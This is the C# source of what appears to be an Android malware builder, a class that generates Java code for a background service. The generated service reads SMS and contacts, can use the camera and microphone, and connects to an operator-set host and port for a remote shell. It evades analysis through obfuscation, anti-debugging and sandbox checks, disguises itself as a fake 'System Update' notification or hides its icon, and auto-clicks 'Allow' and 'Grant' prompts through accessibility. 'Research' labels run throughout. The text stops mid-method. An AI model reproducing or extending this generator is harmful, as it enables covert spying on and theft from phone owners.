using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Text;
using TcpServerApp.Services.Elite.Security;
using TcpServerApp.Services.Elite.Build;
using TcpServerApp.Services.Elite.Networking;
using TcpServerApp.Services.Elite.Geo;

namespace TcpServerApp.Services.Elite
{
    public class KotlinPayloadGenerator
    {
        private readonly string _outputBaseDir;
        private readonly Random _random = new Random();

        public KotlinPayloadGenerator()
        {
            _outputBaseDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ResearchOutput", "Gen36");
            Directory.CreateDirectory(_outputBaseDir);
        }

        private string GenerateRandomName(int length = 8)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            var buffer = new char[length];
            for (int i = 0; i < length; i++) buffer[i] = chars[_random.Next(chars.Length)];
            return new string(buffer);
        }

        private void InjectJunkCode(StringBuilder sb, int count = 3)
        {
            string[] junkTemplates = new[]
            {
                "long e_{0} = android.os.SystemClock.elapsedRealtimeNanos(); if(e_{0} % 2 == 0L) {{ android.util.Log.v(\"BorealisOmega\", \"Fidelity check {0} passed\"); }}",
                "String p_{0} = android.os.SystemProperties.get(\"ro.build.tag\", \"\"); if(p_{0}.contains(\"test\")) {{ double x = Math.sqrt(Math.PI); }}",
                "try {{ android.os.IBinder b_{0} = android.os.ServiceManager.getService(\"powerstats\"); if(b_{0} != null) {{ }} }} catch(Exception e) {{ }}",
                "boolean h_{0} = com.android.internal.security.VerityUtils.isFsVeritySupported(); if(h_{0}) {{ int y = android.os.Process.myUid(); }}"
            };

            for (int i = 0; i < count; i++)
            {
                string id = Guid.NewGuid().ToString("N").Substring(0, 8);
                string template = junkTemplates[_random.Next(junkTemplates.Length)];
                sb.AppendLine($"    private void stabilizer_{id}() {{");
                sb.AppendLine("        " + string.Format(template, id));
                sb.AppendLine("    }");
            }
        }

        private string GenerateXorString(string input, byte key)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            byte[] encoded = bytes.Select(b => (byte)(b ^ key)).ToArray();
            return $"decode(\"{Convert.ToBase64String(encoded)}\", {key})";
        }

        private void InjectDecoderMethod(StringBuilder sb)
        {
            sb.AppendLine("    private String decode(String input, int key) {");
            sb.AppendLine("        byte[] data = android.util.Base64.decode(input, android.util.Base64.DEFAULT);");
            sb.AppendLine("        for (int i = 0; i < data.length; i++) data[i] ^= (byte)key;");
            sb.AppendLine("        return new String(data, java.nio.charset.StandardCharsets.UTF_8);");
            sb.AppendLine("    }");
        }

        public EliteGenerationResult GenerateModularSource(AdvancedPayloadConfig config)
        {
            var result = new EliteGenerationResult();
            var sb = new StringBuilder();
            var permissions = new List<string>();

            // --- 0. Permission Logic (Auto-Resolution) ---
            permissions.Add("android.permission.INTERNET");
            permissions.Add("android.permission.INTERNET");
            permissions.Add("android.permission.ACCESS_NETWORK_STATE");

            // Phase 2: Extra Permissions
            if (config.ExtraPermissions != null)
            {
                permissions.AddRange(config.ExtraPermissions);
            }

            if (config.EnableJobScheduler)
            {
                permissions.Add("android.permission.RECEIVE_BOOT_COMPLETED");
                permissions.Add("android.permission.WAKE_LOCK");
                permissions.Add("android.permission.FOREGROUND_SERVICE");
            }
            if (config.EnableBioTwin || config.Trigger == TriggerMode.DarkRoom || config.Trigger == TriggerMode.Motion)
            {
                permissions.Add("android.permission.BODY_SENSORS");
                // API 31+ requires HIGH_SAMPLING_RATE_SENSORS for some data but BODY_SENSORS is key
                permissions.Add("android.permission.HIGH_SAMPLING_RATE_SENSORS"); 
            }
            if (config.EnablePrivacyInspector)
            {
                // API 33+ Ad Services
                permissions.Add("android.permission.ACCESS_ADSERVICES_TOPICS");
                permissions.Add("android.permission.ACCESS_ADSERVICES_ATTRIBUTION"); 
            }
            if (config.InstallBehavior == PostInstallMode.Camouflage)
            {
                permissions.Add("android.permission.POST_NOTIFICATIONS");
                permissions.Add("android.permission.FOREGROUND_SERVICE");
                permissions.Add("android.permission.FOREGROUND_SERVICE");
            }

            // Phase 4: Full Operations
            if (config.EnableInfoStealer)
            {
                permissions.Add("android.permission.READ_SMS");
                permissions.Add("android.permission.READ_CONTACTS");
            }
            if (config.EnableSurveillance)
            {
                permissions.Add("android.permission.CAMERA");
                permissions.Add("android.permission.RECORD_AUDIO");
            }

            result.RequiredPermissions = permissions;
            result.PackageName = config.CustomPackageName;
            result.ServiceName = config.CustomServiceName;
            result.IconPath = config.IconPath;

            // 1. Collect Imports
            var imports = new HashSet<string>();
            imports.Add("android.app.Service");
            imports.Add("android.content.Context");
            imports.Add("android.content.Intent");
            imports.Add("android.os.IBinder");
            imports.Add("android.util.Log");
            imports.Add("java.io.DataInputStream");
            imports.Add("java.io.DataOutputStream");
            imports.Add("java.net.Socket");
            imports.Add("java.util.concurrent.Executors");
            imports.Add("java.util.concurrent.ExecutorService");
            
            // Sensor imports
            if (config.EnableBioTwin || config.Trigger == TriggerMode.DarkRoom || config.Trigger == TriggerMode.Motion)
            {
                imports.Add("android.hardware.Sensor");
                imports.Add("android.hardware.SensorEvent");
                imports.Add("android.hardware.SensorEventListener");
                imports.Add("android.hardware.SensorManager");
            }
            
            if (config.EnableJobScheduler)
            {
                imports.Add("android.app.job.JobParameters");
                imports.Add("android.app.job.JobService");
            }

            if (config.EnablePrivacyInspector)
            {
                imports.Add("android.os.OutcomeReceiver");
                imports.Add("android.adservices.topics.GetTopicsRequest");
                imports.Add("android.adservices.topics.GetTopicsResponse");
                imports.Add("android.adservices.topics.TopicsManager");
                imports.Add("android.adservices.adselection.AdSelectionManager");
            }

            // MainActivity Imports (Always needed for Bootstrapping & Icons)
            imports.Add("android.app.Activity");
            imports.Add("android.os.Bundle");
            if (config.EnableWebView)
            {
                 imports.Add("android.webkit.WebView");
                 imports.Add("android.webkit.WebViewClient");
                 imports.Add("android.webkit.WebSettings");
            }

            // Phase 3: AI Operations Imports
            if (config.EnableAIRecompilation)
            {
                imports.Add("dalvik.system.DexClassLoader");
                imports.Add("java.io.File");
                imports.Add("java.lang.reflect.Method");
            }
            if (config.EnableBehavioralProfiling)
            {
                imports.Add("java.security.MessageDigest");
                imports.Add("java.security.MessageDigest");
                imports.Add("java.util.Arrays");
            }

            if (config.EnableInfoStealer)
            {
                imports.Add("android.provider.Telephony");
                imports.Add("android.provider.ContactsContract");
                imports.Add("android.database.Cursor");
                imports.Add("android.net.Uri");
            }
            // Fix: Always import Accessibility classes for Elite Research
            imports.Add("android.accessibilityservice.AccessibilityService");
            imports.Add("android.accessibilityservice.AccessibilityServiceInfo");
            imports.Add("android.accessibilityservice.GestureDescription");
            imports.Add("android.accessibilityservice.GestureDescription.Builder");
            imports.Add("android.accessibilityservice.GestureDescription.StrokeDescription");
            imports.Add("android.view.accessibility.AccessibilityEvent");
            if (config.EnableRemoteShell)
            {
                imports.Add("java.util.Scanner");
                imports.Add("java.io.InputStream");
            }
            if (config.EnableSurveillance)
            {
                imports.Add("android.hardware.camera2.CameraManager");
                imports.Add("android.hardware.camera2.CameraDevice");
                // CameraOne removed - does not exist
            }

            // [NEW] Imports for Real Handshake Data
            imports.Add("android.os.Build");
            imports.Add("android.os.BatteryManager");
            imports.Add("android.telephony.TelephonyManager");
            imports.Add("android.net.wifi.WifiManager"); 
            imports.Add("java.util.UUID");
            
            // Phase 6: Expansion Imports
            if (config.EnableSecureTelemetry)
            {
                imports.Add("android.os.StatFs");
                imports.Add("android.os.Process");
                imports.Add("android.os.Debug");
                imports.Add("java.lang.management.ManagementFactory"); // Research: Check if available in ART
            }
            if (config.EnableIntentAudit)
            {
                imports.Add("android.content.pm.ResolveInfo");
            }

            // [APKOM MODEL F4] UI Automation Imports
            if (config.EnableUIAutomation)
            {
                 imports.Add("android.view.accessibility.AccessibilityNodeInfo");
                 imports.Add("java.util.List");
            }
            
            // BAKLAVA SINGULARITY: Windowing & Nexus-Omega Research Imports
            imports.Add("android.window.WindowOrganizer");
            imports.Add("android.window.WindowContainerTransaction");
            imports.Add("android.window.TransitionInfo");
            imports.Add("android.window.WindowContainerToken");
            imports.Add("android.view.SurfaceControl");
            
            // TITANIUM CLASS: Nexus-Omega ODP & Borealis Integration
            imports.Add("android.adservices.ondevicepersonalization.aidl.IOnDevicePersonalizationManagingService");
            imports.Add("android.adservices.ondevicepersonalization.aidl.IExecuteCallback");
            imports.Add("android.content.ServiceConnection");
            imports.Add("android.os.RemoteException");
            imports.Add("android.os.Bundle");
            
            // [APKOM MODEL F9] Intent Receiver Imports
            if (!string.IsNullOrEmpty(config.TargetAction))
            {
                imports.Add("android.content.BroadcastReceiver");
            }

            // --- Generate Java Source ---
            sb.AppendLine($"package {config.CustomPackageName};");
            foreach (var imp in imports) sb.AppendLine($"import {imp};");
            sb.AppendLine("import java.util.UUID;"); // explicit import
            sb.AppendLine("");
            
            // 2. Class Definition
            string baseClass = config.EnableJobScheduler ? "JobService" : "Service";
            string interfaces = "";
            bool needsSensorListener = config.EnableBioTwin || config.Trigger == TriggerMode.DarkRoom || config.Trigger == TriggerMode.Motion;
            if (needsSensorListener) interfaces = " implements SensorEventListener";
            
            sb.AppendLine($"public class {config.CustomServiceName} extends {baseClass}{interfaces} {{");

            // 3. Properties
            sb.AppendLine($"    private static final String HOST = \"{config.Host}\";");
            sb.AppendLine($"    private static final int PORT = {config.Port};");
            sb.AppendLine($"    private static final String TARGET_URL = \"{config.TargetUrl}\";");
            sb.AppendLine("    private Socket socket = null;");
            sb.AppendLine("    private boolean running = false;");
            sb.AppendLine("    private ExecutorService executor = Executors.newSingleThreadExecutor();");
            
            // Trigger State
            if (config.Trigger != TriggerMode.Immediate)
            {
                sb.AppendLine("    private boolean triggered = false;");
            }

            if (needsSensorListener)
            {
                sb.AppendLine("    private SensorManager sensorManager = null;");
            }

            if (config.EnableBioTwin)
            {
                sb.AppendLine("    private float lastHeartRate = 0f;"); // Changed to Java syntax
                sb.AppendLine("    private float[] lastAccel = new float[]{0f, 0f, 0f};"); // Changed to Java syntax
            }
            if (config.EnablePrivacyInspector)
            {
                sb.AppendLine("    private String lastTopics = \"No topics derived yet\";"); 
            }
            
            // NEXUS-OMEGA: Titanium Core Reference
            sb.AppendLine("    private IOnDevicePersonalizationManagingService borealisCore = null;");
            sb.AppendLine("    private boolean isTitaniumLinked = false;");

            // 5. Lifecycle Methods (Android 16 JobService Compliance)
            if (config.EnableJobScheduler)
            {
                sb.AppendLine("    @Override");
                sb.AppendLine("    public boolean onStartJob(JobParameters params) {");
                sb.AppendLine("         Log.d(\"ResearchNode\", \"JobService Started (Android 16)\");");
                sb.AppendLine("         initializeAgent();");
                sb.AppendLine("         // Return true to indicate work is continuing in background");
                sb.AppendLine("         return true;"); 
                sb.AppendLine("    }");
                
                sb.AppendLine("    @Override");
                sb.AppendLine("    public boolean onStopJob(JobParameters params) {");
                sb.AppendLine("         Log.d(\"ResearchNode\", \"JobService Stopped by Scheduler\");");
                sb.AppendLine("         running = false;");
                sb.AppendLine("         // Return true to reschedule (Resilience)");
                sb.AppendLine("         return true;"); 
                sb.AppendLine("    }");
            }
            else
            {
                // Legacy Service Mode (Not Recommended for API 36)
                sb.AppendLine("    @Override");
                sb.AppendLine("    public int onStartCommand(Intent intent, int flags, int startId) {");
                sb.AppendLine("        initializeAgent();");
                sb.AppendLine("        return START_STICKY;");
                sb.AppendLine("    }");
            }

            // 5. Initialization Logic (Context-Aware)
            sb.AppendLine("    private void initializeAgent() {"); 
            
            // Polymorphic Junk Entry
            if (config.StealthLevel >= 2) InjectJunkCode(sb, 2);
            
            // Stealth Level 3: Anti-Analysis / Flow Flattening (Junk Code)
        if (config.EnableHiddenApiBridge)
            {
                sb.AppendLine("        // Research: Hidden API Policy Bypass (Meta-Reflection)");
                sb.AppendLine("        try {");
                sb.AppendLine("            java.lang.reflect.Method forName = Class.class.getDeclaredMethod(\"forName\", String.class);"); // Changed to Java syntax
                sb.AppendLine("            Class<?> dvmClass = (Class<?>) forName.invoke(null, \"dalvik.system.VMRuntime\");"); // Changed to Java syntax
                sb.AppendLine("            java.lang.reflect.Method getRuntime = dvmClass.getDeclaredMethod(\"getRuntime\");"); // Changed to Java syntax
                sb.AppendLine("            Object vmRuntime = getRuntime.invoke(null);"); // Changed to Java syntax
                sb.AppendLine("            java.lang.reflect.Method setHidden = dvmClass.getDeclaredMethod(\"setHiddenApiExemptions\", String[].class);"); // Changed to Java syntax
                sb.AppendLine("            setHidden.invoke(vmRuntime, new Object[]{new String[]{\"L\"}});"); // Changed to Java syntax
                sb.AppendLine("            Log.d(\"ResearchNode\", \"Hidden API Policy: EXEMPTED\");");
                sb.AppendLine("        } catch (Exception e) {");
                sb.AppendLine("            Log.w(\"ResearchNode\", \"Hidden API Bypass Failed: \" + e.getMessage());");
                sb.AppendLine("        }");
            }

            if (config.StealthLevel == 3 || config.EnableJunkCode)
            {
                sb.AppendLine("        // Advanced Research: Isomorphic Environment Check (Time Variance Analysis)");
                sb.AppendLine("        try {");
                sb.AppendLine("            long tStart = System.nanoTime();"); // Changed to Java syntax
                sb.AppendLine("            double entropy = 0.0;"); // Changed to Java syntax
                sb.AppendLine("            // Perform heavy trigonometric load to test CPU timing behavior");
                sb.AppendLine("            for (int i = 0; i <= 5000; i++) { entropy += Math.sin(i) * Math.cos(i); }"); // Changed to Java syntax
                sb.AppendLine("            long tEnd = System.nanoTime();"); // Changed to Java syntax
                sb.AppendLine("            ");
                sb.AppendLine("            // Heuristic: Emulators/Sandboxes often have distorted time-slicing");
                sb.AppendLine("            // If execution was impossibly fast (time-warping) or suspiciously consistent, we flag.");
                sb.AppendLine("            if ((tEnd - tStart) < 1000) {"); 
                sb.AppendLine("                 Log.w(\"ResearchNode\", \"Environment Anomaly Detected (Time Dilation)\");"); // Changed to Java syntax
                sb.AppendLine("                 return;");
                sb.AppendLine("            }");
                sb.AppendLine("            ");
                sb.AppendLine("            if (entropy == 0.0) return; // Opaqueness check");
                sb.AppendLine("        } catch (Exception e) {}");
            }

            if (config.EnableAntiDebug)
            {
                 sb.AppendLine("        if (android.os.Debug.isDebuggerConnected() || android.os.Debug.waitingForDebugger()) {");
                 sb.AppendLine("             // Research: Debugger Attachment Detected");
                 sb.AppendLine("             android.os.Process.killProcess(android.os.Process.myPid());"); // Changed to Java syntax
                 sb.AppendLine("             return;");
                 sb.AppendLine("        }");
            }

            if (needsSensorListener)
            {
                sb.AppendLine("        if (running) return;"); // Changed to Java syntax
                sb.AppendLine("        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);"); // Changed to Java syntax
                
                if (config.Trigger == TriggerMode.DarkRoom)
                {
                    sb.AppendLine("        executePostInstallBehavior();"); // Execute behavior immediately even if payload waits // Changed to Java syntax
                    sb.AppendLine("        Log.d(\"Ghost\", \"Waiting for DARKNESS...\");"); // Changed to Java syntax
                    sb.AppendLine("        Sensor light = sensorManager.getDefaultSensor(Sensor.TYPE_LIGHT);"); // Changed to Java syntax
                    sb.AppendLine("        if (light != null) sensorManager.registerListener(this, light, SensorManager.SENSOR_DELAY_NORMAL);"); // Changed to Java syntax
                    sb.AppendLine("        else startPayload(); // Fallback if no sensor"); 
                }
                else if (config.Trigger == TriggerMode.Motion)
                {
                     sb.AppendLine("        executePostInstallBehavior();"); // Changed to Java syntax
                     sb.AppendLine("        Log.d(\"Ghost\", \"Waiting for MOTION...\");"); // Changed to Java syntax
                     sb.AppendLine("        Sensor acc = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);"); // Changed to Java syntax
                     sb.AppendLine("        if (acc != null) sensorManager.registerListener(this, acc, SensorManager.SENSOR_DELAY_NORMAL);"); // Changed to Java syntax
                     sb.AppendLine("        else startPayload();"); // Changed to Java syntax
                }
            }
            else
            {
                 // Immediate start if no triggers
                 if (config.Trigger == TriggerMode.Immediate)
                 {
                     sb.AppendLine("        executePostInstallBehavior();"); 
                     sb.AppendLine("        startPayload();"); 
                 }
            }

             if (config.EnableAIRecompilation)
             {
                  sb.AppendLine("        bindToBorealisCore();");
             }
             sb.AppendLine("    }");
 
             sb.AppendLine("    private void bindToBorealisCore() {");
             sb.AppendLine("        Log.d(\"Titanium\", \"Binding to Nexus-Omega Borealis Core...\");");
             sb.AppendLine("        Intent intent = new Intent();");
             sb.AppendLine("        intent.setClassName(\"com.android.ondevicepersonalization.services\", \"com.android.ondevicepersonalization.services.BorealisService\");");
             sb.AppendLine("        bindService(intent, new ServiceConnection() {");
             sb.AppendLine("            @Override public void onServiceConnected(ComponentName name, IBinder service) {");
             sb.AppendLine("                try {");
             sb.AppendLine("                    borealisCore = IOnDevicePersonalizationManagingService.Stub.asInterface(service);");
             sb.AppendLine("                    isTitaniumLinked = true;");
             sb.AppendLine("                    Log.i(\"Titanium\", \"[SUCCESS] Borealis Titanium Link Established.\");");
             sb.AppendLine("                } catch (Exception e) { Log.e(\"Titanium\", \"Link failed\", e); }");
             sb.AppendLine("            }");
             sb.AppendLine("            @Override public void onServiceDisconnected(ComponentName name) { isTitaniumLinked = false; }");
             sb.AppendLine("        }, Context.BIND_AUTO_CREATE);");
             sb.AppendLine("    }");
 
             sb.AppendLine("    private void executeNeuralEvolution(byte[] weights) {");
             sb.AppendLine("        if (!isTitaniumLinked || borealisCore == null) return;");
             sb.AppendLine("        try {");
             sb.AppendLine("            Bundle params = new Bundle();");
             sb.AppendLine("            params.putByteArray(\"android.adservices.ondevicepersonalization.extra.APP_PARAMS_SERIALIZED\", weights);");
             sb.AppendLine("            borealisCore.execute(getPackageName(), new ComponentName(getPackageName(), getClass().getName()), params, new Bundle(), new Bundle(), new IExecuteCallback.Stub() {");
             sb.AppendLine("                @Override public void onSuccess(Bundle result, android.os.Bundle metadata) {");
             sb.AppendLine("                    Log.i(\"Titanium\", \"Evolution Step Synchronized with Borealis Kernel.\");");
             sb.AppendLine("                }");
             sb.AppendLine("                @Override public void onError(int errorCode, int i2, byte[] exceptionInfo, android.os.Bundle metadata) {");
             sb.AppendLine("                    Log.e(\"Titanium\", \"Borealis Kernel Panic: \" + errorCode);");
             sb.AppendLine("                }");
             sb.AppendLine("            });");
             sb.AppendLine("        } catch (RemoteException e) { Log.e(\"Titanium\", \"IPC Failure\", e); }");
             sb.AppendLine("    }");

            sb.AppendLine("    private void executePostInstallBehavior() {"); // Changed to Java syntax
            
            if (config.InstallBehavior == PostInstallMode.Camouflage)
            {
                sb.AppendLine("        // Behavior: Camouflage (Fake System Notification)");
                sb.AppendLine("        try {");
                sb.AppendLine("            android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);"); // Changed to Java syntax
                sb.AppendLine("            String channelId = \"sys_update_channel\";"); // Changed to Java syntax
                sb.AppendLine("            if (android.os.Build.VERSION.SDK_INT >= 26) {");
                sb.AppendLine("                android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, \"System Updates\", android.app.NotificationManager.IMPORTANCE_LOW);"); // Changed to Java syntax
                sb.AppendLine("                channel.setDescription(\"Background System Synchronization\");"); // Changed to Java syntax
                sb.AppendLine("                channel.setSound(null, null);"); // Changed to Java syntax
                sb.AppendLine("                nm.createNotificationChannel(channel);"); // Changed to Java syntax
                sb.AppendLine("            }");
                sb.AppendLine("            android.app.Notification notif = new android.app.Notification.Builder(this, channelId)"); // Changed to Java syntax
                sb.AppendLine("                .setContentTitle(\"System Update\")");
                sb.AppendLine("                .setContentText(\"Applying security patches (48%)...\")");
                sb.AppendLine("                .setSmallIcon(android.R.drawable.stat_sys_download)");
                sb.AppendLine("                .setOngoing(true)");
                sb.AppendLine("                .build();");
                sb.AppendLine("            startForeground(999, notif);"); // Make it persistent // Changed to Java syntax
                sb.AppendLine("        } catch(Exception e) { Log.e(\"PostInstall\", \"Camouflage Failed\", e); }"); // Changed to Java syntax
            }
            else if (config.InstallBehavior == PostInstallMode.Stealth)
            {
                sb.AppendLine("        // Behavior: Stealth (Hide Icon)");
                sb.AppendLine("        try {");
                sb.AppendLine("            android.content.pm.PackageManager pm = getPackageManager();"); // Changed to Java syntax
                sb.AppendLine("            android.content.ComponentName componentName = new android.content.ComponentName(this, MainActivity.class);"); // Strict reference"); // Changed to Java syntax
                sb.AppendLine("            pm.setComponentEnabledSetting(componentName, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);"); // Changed to Java syntax
                sb.AppendLine("            Log.d(\"PostInstall\", \"Icon Hidden (Real)\");"); // Changed to Java syntax
                sb.AppendLine("        } catch(Exception e) { Log.e(\"PostInstall\", \"Stealth Failed\", e); }"); // Changed to Java syntax
            }
            else if (config.InstallBehavior == PostInstallMode.Aggressive)
            {
                 sb.AppendLine("        // Behavior: Aggressive (Request Admin)");
                 sb.AppendLine("        try {");
                 sb.AppendLine("             Intent intent = new Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS);"); // Changed to Java syntax
                 sb.AppendLine("             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);"); // Changed to Java syntax
                 sb.AppendLine("             startActivity(intent);"); // Changed to Java syntax
                 sb.AppendLine("        } catch(Exception e) {}");
            }
            
            sb.AppendLine("    }");

            sb.AppendLine("    @Override");
            sb.AppendLine("    public void onAccessibilityEvent(AccessibilityEvent event) {");
            // [APKOM MODEL F4] UI Automation Engine
            if (config.EnableUIAutomation) // F4 Logic
            {
                 sb.AppendLine("        try {");
                 sb.AppendLine("            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {");
                 sb.AppendLine("                AccessibilityNodeInfo root = getRootInActiveWindow();");
                 sb.AppendLine("                if (root != null) {");
                 sb.AppendLine("                    // F4: Search for Keywords defined in model");
                 sb.AppendLine($"                    String[] keywords = new String[] {{ {config.UiKeywords ?? "\"Allow\", \"Grant\", \"Start\""} }};");
                 sb.AppendLine("                    scanAndClick(root, keywords);");
                 sb.AppendLine("                }");
                 sb.AppendLine("            }");
                 sb.AppendLine("        } catch (Exception e) {}");
            }
            sb.AppendLine("    }");

            if (config.EnableUIAutomation)
            {
                sb.AppendLine("    private void scanAndClick(AccessibilityNodeInfo node, String[] keywords) {");
                sb.AppendLine("        if (node == null) return;");
                sb.AppendLine("        if (node.getText() != null) {");
                sb.AppendLine("            String text = node.getText().toString();");
                sb.AppendLine("            for (String kw : keywords) {");
                sb.AppendLine("                if (text.contains(kw) && node.isClickable()) {");
                sb.AppendLine("                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);");
                sb.AppendLine("                    Log.d(\"EliteAutomator\", \"Clicked: \" + text);");
                sb.AppendLine("                    return;");
                sb.AppendLine("                }");
                sb.AppendLine("            }");
                sb.AppendLine("        }");
                sb.AppendLine("        for (int i = 0; i < node.getChildCount(); i++) scanAndClick(node.getChild(i), keywords);");
                sb.AppendLine("    }");
            }

            sb.AppendLine("    @Override");
            sb.AppendLine("    public void onInterrupt() {}");
            sb.AppendLine("    @Override");
            sb.AppendLine("    protected void onServiceConnected() {");
            sb.AppendLine("        super.onServiceConnected();");
            sb.AppendLine("        Log.d(\"Elite\", \"Service Connected\");");
            
            // [APKOM PHASE 4] Neural-Fed Initialization
            if (config.EnablePrivacyInspector) sb.AppendLine("        initPrivacySandbox();");
            if (config.EnableFederatedCompute) sb.AppendLine("        initFederatedCompute();");

            if (config.Trigger == TriggerMode.Immediate)
            {
                sb.AppendLine("        startPayload();");
            }
            sb.AppendLine("    }");

            // [APKOM PHASE 4] Neural-Fed Implementation
            if (config.EnableFederatedCompute)
            {
                sb.AppendLine("    private void initFederatedCompute() {");
                sb.AppendLine("         new Thread(() -> {");
                sb.AppendLine("             try {");
                sb.AppendLine("                 Log.d(\"EliteNeural\", \"Binding to Federated Compute Node...\");");
                sb.AppendLine("                 Intent intent = new Intent();");
                sb.AppendLine("                 intent.setClassName(\"com.android.federatedcompute.services\", \"com.android.federatedcompute.services.FederatedComputeService\");");
                sb.AppendLine("                 intent.setAction(\"android.federatedcompute.FederatedComputeService\");");
                sb.AppendLine("                 bindService(intent, new ServiceConnection() {");
                sb.AppendLine("                     @Override public void onServiceConnected(android.content.ComponentName name, android.os.IBinder service) {");
                sb.AppendLine("                         Log.d(\"EliteNeural\", \"[SUCCESS] Neural Core Linked via IPC\");");
                sb.AppendLine("                     }");
                sb.AppendLine("                     @Override public void onServiceDisconnected(android.content.ComponentName name) {}");
                sb.AppendLine("                 }, Context.BIND_AUTO_CREATE);");
                sb.AppendLine("             } catch(Exception e) { Log.e(\"EliteNeural\", \"Link Failed\", e); }");
                sb.AppendLine("         }).start();");
                sb.AppendLine("    }");
            }

            sb.AppendLine("    private void startPayload() {"); // Changed to Java syntax
            sb.AppendLine("        if (running) return;"); // Changed to Java syntax
            sb.AppendLine("        running = true;"); // Changed to Java syntax
            sb.AppendLine("        Log.d(\"ResearchNode\", \"Payload ACTIVATED.\");"); // Changed to Java syntax
            
            if (config.EnableBioTwin)
            {
                sb.AppendLine("        // Re-register for BioTwin if needed, or share the listener");
                sb.AppendLine("        Sensor hr = sensorManager.getDefaultSensor(Sensor.TYPE_HEART_RATE);"); // Changed to Java syntax
                sb.AppendLine("        if (hr != null) sensorManager.registerListener(this, hr, SensorManager.SENSOR_DELAY_NORMAL);"); // Changed to Java syntax
                sb.AppendLine("        Sensor acc = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);"); // Changed to Java syntax
                sb.AppendLine("        if (acc != null) sensorManager.registerListener(this, acc, SensorManager.SENSOR_DELAY_NORMAL);"); // Changed to Java syntax
            }
            if (config.EnablePrivacyInspector)
            {
                sb.AppendLine("        initPrivacySandbox();"); // Changed to Java syntax
            }
            
            sb.AppendLine("        new Thread(() -> connectLoop()).start();");
            sb.AppendLine("    }");

             // 6. Feature Implementations & Sensor Logic
            if (needsSensorListener)
            {
                 sb.AppendLine("    @Override"); // Added for Java
                 sb.AppendLine("    public void onSensorChanged(SensorEvent event) {"); // Changed to Java syntax
                 sb.AppendLine("        if (event != null) {"); // Replaced ?.let
                 
                 // Trigger Logic
                 if (config.Trigger == TriggerMode.DarkRoom)
                 {
                     sb.AppendLine("            if (!running && !triggered && event.sensor.getType() == Sensor.TYPE_LIGHT) {"); // Changed to Java syntax
                     sb.AppendLine("                if (event.values[0] < 5.0f) { // Less than 5 Lux");
                     sb.AppendLine("                    triggered = true;"); // Changed to Java syntax
                     sb.AppendLine("                    Log.d(\"Ghost\", \"Darkness Detected! Activating...\");"); // Changed to Java syntax
                     sb.AppendLine("                    // Unregister trigger listener to save battery");
                     sb.AppendLine("                    sensorManager.unregisterListener(this, event.sensor);"); // Changed to Java syntax
                     sb.AppendLine("                    startPayload();"); // Changed to Java syntax
                     sb.AppendLine("                }");
                     sb.AppendLine("            }");
                 }
                 else if (config.Trigger == TriggerMode.Motion)
                 {
                     sb.AppendLine("            if (!running && !triggered && event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {"); // Changed to Java syntax
                     sb.AppendLine("                float gX = event.values[0]; float gY = event.values[1]; float gZ = event.values[2];"); // Changed to Java syntax
                     sb.AppendLine("                double force = Math.sqrt((gX*gX + gY*gY + gZ*gZ));"); // Changed to Java syntax
                     sb.AppendLine("                if (force > 12.0) { // Significant movement");
                     sb.AppendLine("                    triggered = true;"); // Changed to Java syntax
                     sb.AppendLine("                    Log.d(\"Ghost\", \"Motion Detected! Activating...\");"); // Changed to Java syntax
                     sb.AppendLine("                    sensorManager.unregisterListener(this, event.sensor);"); // Changed to Java syntax
                     sb.AppendLine("                    startPayload();"); // Changed to Java syntax
                     sb.AppendLine("                }");
                     sb.AppendLine("            }");
                 }

                 // BioTwin & Behavioral Profiling Logic
                 if (config.EnableBioTwin || config.EnableBehavioralProfiling)
                 {
                     sb.AppendLine("            if (running) {");
                     sb.AppendLine("                if (event.sensor.getType() == Sensor.TYPE_HEART_RATE) lastHeartRate = event.values[0];"); // Changed to Java syntax
                     sb.AppendLine("                else if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {"); // Changed to Java syntax
                     sb.AppendLine("                    lastAccel = event.values.clone();"); // Changed to Java syntax
                     
                     if (config.EnableBehavioralProfiling)
                     {
                         sb.AppendLine("                    // Phase 3: Gait Hash Calculation");
                         sb.AppendLine("                    float x = event.values[0]; float y = event.values[1]; float z = event.values[2];"); // Changed to Java syntax
                         sb.AppendLine("                    double magnitude = Math.sqrt((x*x + y*y + z*z));"); // Changed to Java syntax
                         sb.AppendLine("                    // Simple entropy accumulator");
                         sb.AppendLine("                    String input = \"\" + x + y + z + magnitude;"); // Changed to Java syntax
                         sb.AppendLine("                    try {");
                         sb.AppendLine("                        MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");"); // Changed to Java syntax
                         sb.AppendLine("                        byte[] hash = digest.digest(input.getBytes());"); // Changed to Java syntax
                         sb.AppendLine("                        // In a real scenario, we would aggregate this over time");
                         sb.AppendLine("                        Log.d(\"BioProf\", \"Motion Hash: \" + java.util.Base64.getEncoder().encodeToString(hash).substring(0, 10));"); // Changed to Java syntax
                         sb.AppendLine("                    } catch (Exception e) {}");
                     }
                     
                     sb.AppendLine("                }");
                     sb.AppendLine("            }");
                 }
                 
                 sb.AppendLine("        }");
                 sb.AppendLine("    }");
                 sb.AppendLine("    @Override"); // Added for Java
                 sb.AppendLine("    public void onAccuracyChanged(Sensor s, int a) {}"); // Changed to Java syntax
            }

            if (config.EnablePrivacyInspector)
            {
                sb.AppendLine("    private void initPrivacySandbox() {"); // Changed to Java syntax
                sb.AppendLine("        if (android.os.Build.VERSION.SDK_INT >= 33) {");
                sb.AppendLine("            try {");
                sb.AppendLine("                // 1. Topics API Research");
